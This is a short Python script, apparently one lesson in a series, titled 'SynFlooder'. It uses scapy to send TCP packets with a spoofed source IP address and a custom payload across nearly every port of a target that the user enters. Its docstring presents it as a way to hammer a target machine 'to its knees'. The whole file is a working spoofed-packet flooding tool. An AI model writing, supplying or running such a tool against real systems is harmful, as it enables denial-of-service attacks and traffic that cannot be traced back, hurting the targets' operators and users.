#!/usr/bin/python3

import os
import sys
import crypt
import inspect
import subprocess
import scapy.all as scapy
from termcolor import colored
from urllib.request import urlopen


"""
34. Runing SynFlooder with changed source IP address: synflooder.py

So, this is a pretty cool program for hammering the range of ports on a target
and bringing that machine to its knees. Well, actually, on instance of this
program running probably won't do that. This is a good example of sending
whatever you want data in the Raw() structure. This also contains a good example
of printing "progress" dots across the screen as the program runs. Note line 39.

"""

def lineno():
    """Call this to get the currently executing line number in the program. """
    return inspect.currentframe().f_back.f_lineno


def flood(src, dst, load, sport):
    progress_str = "."
    ip = scapy.IP(src=src, dst=dst)
    tcp = scapy.TCP(sport=sport)
    raw = scapy.Raw(load=load)
    packet = ip/tcp/raw

    try:
        for dport in range(1024, 65336):    # 65,535 ports
            packet.dport = dport
            print(colored(f"{progress_str}", 'green'), end="", flush=True)
            scapy.send(packet, verbose=False)
    except KeyboardInterrupt:
            print()
            print(colored(f"\n\nOkay!!! I'll stop!!", 'red'))


def main():
    subprocess.call('clear', shell=True)

    src = input(colored("Enter fake source IP address: ", 'yellow'))
    dst = input(colored("Enter target IP address: ", 'yellow'))
    load = input(colored("Enter payload string: ", 'yellow'))
    sport = input(colored("Enter the source port to use: ", 'yellow'))

    flood(src=src, dst=dst, load=load, sport=int(sport))

if __name__ == "__main__":
    main()
